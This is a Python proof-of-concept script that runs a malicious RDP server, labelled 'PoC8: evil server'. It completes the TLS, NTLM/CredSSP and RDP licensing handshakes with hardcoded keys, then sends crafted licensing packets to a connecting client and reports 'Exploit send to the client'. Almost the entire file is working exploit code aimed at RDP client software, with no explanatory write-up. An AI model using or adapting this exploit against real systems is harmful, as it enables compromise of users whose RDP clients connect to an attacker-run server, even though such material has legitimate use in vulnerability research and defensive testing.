#! /usr/bin/python
import socket
import sys
import binascii
import mmap
import socket, ssl
from Crypto.Cipher import ARC4 #pip install pycryptodome
from Crypto.PublicKey import RSA #pip install pycryptodome
import hashlib
import hmac

f = open("PoC8", "r+b")
mm = mmap.mmap(f.fileno(), 0)


# Socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 3389)
print('PoC8: evil server started on %s port %s' % server_address)
sock.bind(server_address)
sock.listen(1)

while True:
	print('waiting for a connection')
	connection, client_address = sock.accept()

	try:
		print('connection from', client_address)
		data = '';

		# PDU 1
		tmp = connection.recv(45)
		connection.sendall(mm[0:19])

		context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
		context.load_cert_chain(certfile="cert.pem", keyfile="key.pem", password="pass")		
		connstream = context.wrap_socket(connection, server_side=True)

		# PDU 2
		tmp = connstream.recv(93)
		connstream.sendall(mm[19:211])
        
		# PDU 3
		recv = bytearray(connstream.recv(439))
		print('\nPDR received; len = ' + str(len(recv)))
        

		NTLMv2_hash  = bytearray(b'\x11\x79\xDE\xB5\x5A\x6A\xE7\x7D\xF2\xE2\x3A\xFE\xB0\xB1\xFF\x6F')

		ServerChallenge = bytearray(b'\x55\x55\x55\x55\x55\x55\x55\x55')

		TimeStamp = bytearray(b'\x60\x7E\xB3\x4A\xC5\xC0\xCD\x01')

		ClientChallenge = bytearray(recv[199:207])
		print('\nClientChallenge = ' + ClientChallenge.hex())

		TargetInfo = bytearray(b'\x02\x00\x0A\x00\x64\x6F\x6D\x61\x69\x6E\x52\x4F\x43\x4F\x01\x00\x0A\x00\x63\x6F\x6D\x70\x75\x74\x65\x72\x32\x33\x04\x00\x0A\x00\x44\x4E\x53\x74\x68\x65\x6D\x6F\x73\x74\x03\x00\x0A\x00\x74\x68\x65\x6D\x6F\x73\x74\x5F\x32\x33\x07\x00\x08\x00\x60\x7E\xB3\x4A\xC5\xC0\xCD\x01\x06\x00\x04\x00\x02\x00\x00\x00\x0A\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09\x00\x22\x00\x54\x00\x45\x00\x52\x00\x4D\x00\x53\x00\x52\x00\x56\x00\x2F\x00\x31\x00\x32\x00\x37\x00\x2E\x00\x30\x00\x2E\x00\x30\x00\x2E\x00\x31\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')

		ntlm_v2_temp_chal = ServerChallenge + (b'\x01\x01\x00\x00\x00\x00\x00\x00') + TimeStamp + ClientChallenge + (b'\x00\x00\x00\x00') + TargetInfo

		digest = hmac.new(NTLMv2_hash, digestmod='md5')
		digest.update(ntlm_v2_temp_chal)
		NtProofString = digest.digest()

		digest2 = hmac.new(NTLMv2_hash, digestmod='md5')
		digest2.update(NtProofString)
		KeyExchangeKey = SessionBaseKey = digest2.digest()
		print('KeyExchangKey = ' + KeyExchangeKey.hex())

		EncryptedRandomSessionKey = recv[361:377]
		print('EncryptedRandomSessionKey = ' + EncryptedRandomSessionKey.hex())                                           

		cipher = ARC4.new(KeyExchangeKey)
		ExportedSessionKey = RandomSessionKey = cipher.encrypt(EncryptedRandomSessionKey)
		print('RandomSessionKey = ' + RandomSessionKey.hex())

		NTLM_SERVER_SIGN_MAGIC = bytearray(b'session key to server-to-client signing key magic constant\x00')

		m = hashlib.md5()
		m.update(ExportedSessionKey + NTLM_SERVER_SIGN_MAGIC)
		ServerSigningKey = m.digest()
		print('\nServerSigningKey = ' + ServerSigningKey.hex())


		NTLM_SERVER_SEAL_MAGIC = bytearray(b'session key to server-to-client sealing key magic constant\x00')


		m2 = hashlib.md5()
		m2.update(ExportedSessionKey + NTLM_SERVER_SEAL_MAGIC)
		RecvRc4Seal = m2.digest()
		print('RecvRc4Seal = ' + RecvRc4Seal.hex())



        	########### nla_decrypt_public_key_hash #################

		serverClientHash = bytearray(b'\x7F\x27\x1F\x6F\x7B\x22\xAE\x23\xAF\xA3\xBE\x8E\x20\x97\xC2\xE1\x32\x15\x50\x87\xA4\x70\x5B\x68\xA7\x9C\x09\xF5\x45\x56\x30\xB0')

		cipher1 = ARC4.new(RecvRc4Seal)
		data = cipher1.encrypt(serverClientHash)
		mm[239:271] = data
		print('\ndata = ' + data.hex())

		cipher2 = ARC4.new(RecvRc4Seal)
		data_buffer_pvBuffer = cipher2.decrypt(data)
		print('data_buffer_pvBuffer = ' + data_buffer_pvBuffer.hex())


		# HMAC-MD5 hash of ConcatenationOf(seq_num,data)
		SeqNo = bytearray(b'\x00\x00\x00\x00')

		RecvSigningKey = ServerSigningKey

		d = hmac.new(RecvSigningKey, digestmod='md5')
		d.update(SeqNo)
		d.update(data_buffer_pvBuffer)
		digest = d.digest()
		print('Digest = ' + d.hexdigest())
		
		checksum = cipher2.decrypt(bytearray(digest[0:8]))
		print('checksum = ' + checksum.hex())

		#Checksum write
		mm[227:235] = checksum

		hashMagic = bytearray(b'CredSSP Server-To-Client Binding Hash\x00')

		connstream.sendall(mm[211:651])

		recv = bytearray(connstream.recv(118))

		recv2 = bytearray(connstream.recv(455))

		connstream.sendall(mm[651:1709])

		recv3 = bytearray(connstream.recv(12))

		recv4 = bytearray(connstream.recv(8))

		recv5 = bytearray(connstream.recv(12))

		recv6 = bytearray(connstream.recv(12))

		recv7 = bytearray(connstream.recv(12))

		recv8 = bytearray(connstream.recv(12))

		recv9 = bytearray(connstream.recv(12))

		recv10 = bytearray(connstream.recv(12))

		recv11 = bytearray(connstream.recv(353))

		recv12 = bytearray(connstream.recv(25))

		recv13 = bytearray(connstream.recv(610))
		print('\nrecv13 = ' + recv13.hex())


		EncryptedPremasterSecret = bytearray(recv13[67:579])
		print('\nEncryptedPremasterSecret = ' + EncryptedPremasterSecret.hex())

		input_reverse = EncryptedPremasterSecret
		input_reverse.reverse()
		input_reverse = int.from_bytes(input_reverse, byteorder='big', signed=False)


		modulus_reverse = bytearray(b'\x8B\x45\x7E\x76\xCB\xE3\x85\xEF\x43\xE8\x45\xD2\xB0\xCE\x3B\x7D\x1A\x1F\xB9\x11\xE1\xE9\x6C\x0F\x8D\x3B\x1D\x96\xFA\xF6\x7E\x7D\xEB\x97\x12\xB1\xBB\xB9\x3C\x3D\x42\xC4\x3E\xD7\xAD\xFE\x7C\xF2\xF8\x24\xE2\xE0\x47\x09\x45\xEF\xFD\xB9\x7B\x88\xD3\x55\x75\x6B\x73\x80\xB7\xA5\x55\x8D\x41\xF9\x7F\x22\x45\x78\x12\xCD\x3F\xCB\x33\xB2\x20\x7E\xBD\x8F\x65\xE8\x38\x9A\x2F\x63\xF3\x2B\xE1\x1A\x3F\xE3\xCE\x55\x9B\x22\x9E\x7C\xC9\xDA\x6E\xCE\x0B\xCA\x9F\x74\x42\x6D\x21\xB4\xBA\xEC\x61\x64\x42\xC4\xEF\x33\x68\x1A\x02\x38\x1F\x6E\x50\xA0\xD2\x08\x39\x5D\x59\x61\x03\xA6\xB3\x02\xA1\x51\xB9\x0F\x29\xD9\x83\xAA\x38\xB6\x7B\xEB\xA7\xF2\x06\x7A\x2D\x05\xE9\x94\xD4\xE9\x50\x48\xD9\x5A\xF0\xF5\x72\x39\x47\xA0\xB3\x69\xE6\x97\xF8\x18\x82\x44\xBF\xD1\xE7\x20\x54\x70\xBD\x61\xF5\x60\xEB\x28\xCD\xBD\xDE\xF4\x8B\x2A\x45\xB6\x5D\xDB\x34\x02\x13\xD6\xA0\xB1\xD6\x37\xF4\xA4\x38\xD8\xDA\xE1\xA4\x48\xEA\x5D\xEE\x2F\x85\xA5\xCA\x85\x76\x18\x9C\x42\x1C\xDD\xC1\x26\xDE\x8D\xC4\x15\x13\xD8\xD8\x3B\x7E\xD3\xE4\x7C\x45\x6B\xDA\xF2\x19\x5C\x88\x28\x32\x1D\x0B\x7D\x05\x68\xAD\xD6\xF3\x19\x69\x78\x17\xBD\x1C\xA8\xBC\x6D\x0E\x4A\xFD\xB8\xC9\x94\xA4\x57\x61\xAA\xB9\x81\x64\x26\xB0\xD4\xE2\x1B\x42\xCB\x8D\xC2\x72\xD4\x64\xD3\xE5\x2A\x44\x6C\x0C\x0A\x91\xDE\xF0\x43\xEC\x90\xB7\x86\xFD\x58\xC0\x1F\xD3\x4E\x7E\x8A\xCE\x30\x65\x96\x0E\xF2\x63\x90\xC5\x36\x39\x38\x84\x80\x53\x3A\x6E\x5F\xF5\x82\x75\x37\x4F\x8C\xE4\x3D\x84\x98\x7A\x39\xFC\x7C\xD2\xC8\x7A\x46\xC2\x54\x46\xE3\x19\xB1\x57\xFE\xCD\xE2\x47\xD5\xEF\xA0\x2C\x94\x9F\x29\xB3\x88\x4E\xAF\x99\x95\xD9\x6E\x53\x65\x5E\xE5\xAE\xDE\xBC\xA8\x43\xCC\xF2\xE4\x0F\xCA\xAB\xC7\x74\xBF\xDA\x4E\x90\x9A\x15\x5A\x90\xE2\x96\x94\xDE\xDC\x6B\xAC\x27\x60\xEF\xFF\x92\x9B\xFC\x3E\xC6\xCB\x96\x95\x1E\xD6\x02\xCA\x6E\x68\x6E\x43\x93\x11\x02\xA3\xD9\x54\xC3\x05\xB5\x05\x20\x3F\x56\x86\x11\x7B\x75\x6A\xBB\xD3\x85\x4A\x85\xDD\x50\x77\x0B\xD7\xDC\x5D\xEB\x80\xCC\xCD\xE1\xA9\xAE\xD4\x52\xF8\x01\x4C\x5F\xD0\x84\x93\x4D\xB1\xBC\xB9\x64\x3F\xC6\x64\xA2\x4D\x4E\xEC\x75\xBB\x98\xD4\x91\x9B\x63\xE7\x5F\x85\x26\x4E\xDB\xC4\x34\x75\x90\xBA')
		modulus_reverse.reverse()
		modulus_reverse = int.from_bytes(modulus_reverse, byteorder='big', signed=False)

		private_exponent_reverse = bytearray(b'\x41\xfb\x19\x18\xa2\x8e\x95\x23\x16\x84\x86\x87\x39\xdb\xe7\x7e\x64\xbe\x1d\xe6\xcb\x9a\x25\x5d\xdf\xc9\xb5\xce\xc0\x3e\x19\x70\x1d\x69\xb6\xad\xf3\xaf\x07\xbd\x06\x23\xef\xee\xe5\xa1\x58\x3e\xe4\x67\x0f\xb9\xaf\xbe\x96\x4e\xa2\x45\x64\x2f\x4c\x69\x34\x43\x88\x6b\xc0\xd8\xf6\xc2\xd0\x5d\x70\x43\x29\x08\x16\x0f\x14\x2c\x2a\x91\xba\x3c\x72\xd7\x34\x16\x56\xec\x6b\xf1\x1f\x46\xff\x90\xc8\x70\x15\x5b\x3a\xdd\xea\x1e\xf7\x5d\x30\x9e\xdc\xe4\x8c\x55\xb6\xd0\x50\xd4\x32\x3a\x94\x77\x51\x54\x0a\xc5\x7c\x25\x58\x5c\x9b\x95\xa4\x4d\x08\x2d\x14\x37\x98\xfe\xf1\x1e\x9f\x84\x72\xbf\xcb\xbc\xe2\xb9\x0c\xcf\x85\x0b\xb8\xaa\x44\xd6\xe3\xf3\x5d\x74\xae\xb7\x66\xfd\x4e\x0e\x68\x79\x13\xba\x21\xa8\xba\x29\x77\xc3\x54\x6e\x6e\x9b\xfd\x7c\xfd\xc5\xfb\x33\xa1\x89\x04\x2b\xe7\xdb\x27\xf1\x8f\x07\x2d\xf1\xec\x15\x3b\xd1\xf3\x6d\x5a\xa9\x9d\x0e\x2b\xb4\x28\x1f\xc4\x15\xa2\xf5\x3b\x4d\x7e\x97\x50\xd9\x76\x33\x1e\x40\xe9\x88\x4a\x73\xc6\xd5\x54\x31\xcb\x94\xf8\xfe\x05\x5d\x75\x6f\x44\x88\xea\x72\xf1\x54\xc5\x95\xea\x76\x16\x75\x39\xcb\x8a\x77\x5f\x3b\x40\x26\xaa\xd4\x6c\x11\xb1\xb6\x72\xb0\x9d\xe6\x59\x7e\x99\x9e\xdb\x27\x65\x5f\xa2\x93\x49\xdd\x3a\x2b\xb1\x73\x9a\x9f\x53\xf4\x43\x9c\x49\x75\x6c\x62\xb1\x10\x50\xce\x15\xf4\x2f\xac\xc9\x1e\x32\xab\x58\x06\x45\x8d\xf3\x73\xd9\x7e\xe3\xb7\x6e\x58\x9a\xb8\x7a\x48\x2f\xac\x9e\xd1\x61\x37\x52\x32\xf1\xc3\xf6\x7e\x98\x73\x41\x62\xc5\x74\x3e\xe7\x2b\x44\x03\xeb\x40\x7f\xb2\x85\xb5\x6b\x1c\xd9\x8f\x7d\xa6\x8f\x21\x85\x22\xee\x5e\x31\xa0\xaf\x37\x93\xa6\x9a\xec\x91\xd2\xef\xa5\xa5\xbf\x71\x67\x75\xdb\xd4\xf1\x2b\xda\x7a\xb9\xf6\xd4\x3e\x67\xb6\xa7\x9c\x75\x53\x5a\x87\x72\x04\x35\xe1\x13\xf9\x4f\x38\x22\xa7\x77\x73\x33\x69\x7c\x05\x50\xaf\x03\xd6\x59\x1d\x1a\x82\xd7\xc5\x95\xcd\x9c\x86\x22\xeb\xaa\x83\x73\x8f\xc9\xd8\x00\x21\x71\x06\xa4\x6d\x57\x9a\xf2\xc0\x67\x1a\x85\x1d\x10\x9e\x9e\xba\xb2\x75\x6f\x31\x95\xa8\x42\xd9\x32\x16\xe0\x84\x36\x4f\x6d\x42\xa0\xec\xdb\x59\xa9\x9b\x29\x2f\xd1\x22\x50\x7d\x99\xac\xbb\x32\xba\xcb\xd3\x19\x15\x0b\x87\xca\x37\xe9\x44\x6f\x5f\x70\x8f\xb0\x4b\x6e\x91\xfb\xc4\xc1')

		private_exponent_reverse = int.from_bytes(private_exponent_reverse, byteorder='big', signed=False)

		y = pow(input_reverse, private_exponent_reverse, modulus_reverse)

		premaster_secret = bytearray(y.to_bytes(48, byteorder='big'))
		premaster_secret.reverse()

		#Size = 48
		print('\npremaster_secret = ' + premaster_secret.hex())

		#Variante; Size = 32
		ClientRandom = bytearray(recv13[31:63])
		print('\nclient_random = ' + ClientRandom.hex())

		#ServerRandom[32] = 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55
		ServerRandom = mm[989:1021]
		print('ServerRandom = ' + ServerRandom.hex())


		#PremasterHash('A') = MD5(S + SHA1('A' + premaster_secret + client_random + server_random))

		s1 = hashlib.sha1()
		s1.update(bytearray(b'A'))
		s1.update(premaster_secret)
		s1.update(ClientRandom)
		s1.update(ServerRandom)
		SHA1 = s1.digest()
		m1 = hashlib.md5()
		m1.update(premaster_secret + SHA1)
		PremasterHash_A = m1.digest()
		print('\nPremasterHash_A = ' + PremasterHash_A.hex())

		s1 = hashlib.sha1()
		s1.update(bytearray(b'BB'))
		s1.update(premaster_secret)
		s1.update(ClientRandom)
		s1.update(ServerRandom)
		SHA1 = s1.digest()
		m1 = hashlib.md5()
		m1.update(premaster_secret + SHA1)
		PremasterHash_B = m1.digest()
		print('PremasterHash_B = ' + PremasterHash_B.hex())

		s1 = hashlib.sha1()
		s1.update(bytearray(b'CCC'))
		s1.update(premaster_secret)
		s1.update(ClientRandom)
		s1.update(ServerRandom)
		SHA1 = s1.digest()
		m1 = hashlib.md5()
		m1.update(premaster_secret + SHA1)
		PremasterHash_C = m1.digest()
		print('PremasterHash_C = ' + PremasterHash_C.hex())

		MasterSecret = PremasterHash_A + PremasterHash_B + PremasterHash_C


		s1 = hashlib.sha1()
		s1.update(bytearray(b'A'))
		s1.update(MasterSecret)
		s1.update(ServerRandom)
		s1.update(ClientRandom)
		SHA1 = s1.digest()
		m1 = hashlib.md5()
		m1.update(MasterSecret + SHA1)
		SessionKeyBlob_A = m1.digest()
		print('SessionKeyBlob_A = ' + SessionKeyBlob_A.hex())

		s1 = hashlib.sha1()
		s1.update(bytearray(b'BB'))
		s1.update(MasterSecret)
		s1.update(ServerRandom)
		s1.update(ClientRandom)
		SHA1 = s1.digest()
		m1 = hashlib.md5()
		m1.update(MasterSecret + SHA1)
		SessionKeyBlob_B = m1.digest()
		print('SessionKeyBlob_B = ' + SessionKeyBlob_B.hex())

		s1 = hashlib.sha1()
		s1.update(bytearray(b'CCC'))
		s1.update(MasterSecret)
		s1.update(ServerRandom)
		s1.update(ClientRandom)
		SHA1 = s1.digest()
		m1 = hashlib.md5()
		m1.update(MasterSecret + SHA1)
		SessionKeyBlob_C = m1.digest()
		print('SessionKeyBlob_C = ' + SessionKeyBlob_C.hex())

		SessionKeyBlob = SessionKeyBlob_A + SessionKeyBlob_B + SessionKeyBlob_C

		# MasterSecret = PremasterHash('A') + PremasterHash('BB') + PremasterHash('CCC')
		#LicensingEncryptionKey = MD5(Second128Bits(SessionKeyBlob) + ClientRandom + ServerRandom))
		m1 = hashlib.md5()
		m1.update(SessionKeyBlob_B)
		m1.update(ClientRandom)
		m1.update(ServerRandom)
		LicensingEncryptionKey = m1.digest()
		print('\nLicensingEncryptionKey = ' + LicensingEncryptionKey.hex())

		#MacData = MD5(MacSaltKey + pad2 + SHA1(MacSaltKey + pad1 + length + data))
		#MacSaltKey = SessionKeyBlob_A
		pad1 = bytearray(b'\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36\x36')                                                                        
		length_le = bytearray(b'\x01\x00\x00\x00')

		cipher4 = ARC4.new(LicensingEncryptionKey)
		data = cipher4.encrypt(bytearray(b'\xDD'))
		print('data = ' + data.hex())

		s1 = hashlib.sha1()
		s1.update(SessionKeyBlob_A)
		s1.update(pad1)
		s1.update(length_le)
		s1.update(data)
		SHA1 = s1.digest()

		pad2 = bytearray(b'\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C\x5C')                                             
		m1 = hashlib.md5()
		m1.update(SessionKeyBlob_A + pad2 + SHA1)
		macData = m1.digest()
		print('macData = ' + macData.hex())

		mm[1740:1756] = macData


		data = bytearray(b'\x51\x52\x53\x54\x00\x00\x00\x00\x04\x00\x00\x00\x60\x61\x62\x63\x02\x00\x00\x00\x68\x69\x01\x00\x00\x00\x6E\x6F')
		cipher4 = ARC4.new(LicensingEncryptionKey)
		target = cipher4.encrypt(data)
		print('target = ' + target.hex())	

		length_le = bytearray(b'\x1C\x00\x00\x00')
		#computedMac = MD5(MacSaltKey + pad2 + SHA1(MacSaltKey + pad1 + length + data))
		s1 = hashlib.sha1()
		s1.update(SessionKeyBlob_A)
		s1.update(pad1)
		s1.update(length_le)
		s1.update(data)
		SHA1 = s1.digest()

		m1 = hashlib.md5()
		m1.update(SessionKeyBlob_A + pad2 + SHA1)
		computedMac = m1.digest()
		print('computedMac = ' + computedMac.hex())

		mm[1782:1810] = target

		mm[1810:1826] = computedMac                                             


		# PDU 4
		connstream.sendall(mm[1709:2703])

		print('\nExploit send to the client')
		
            
	finally:
		# Clean up the connection
		connection.close()


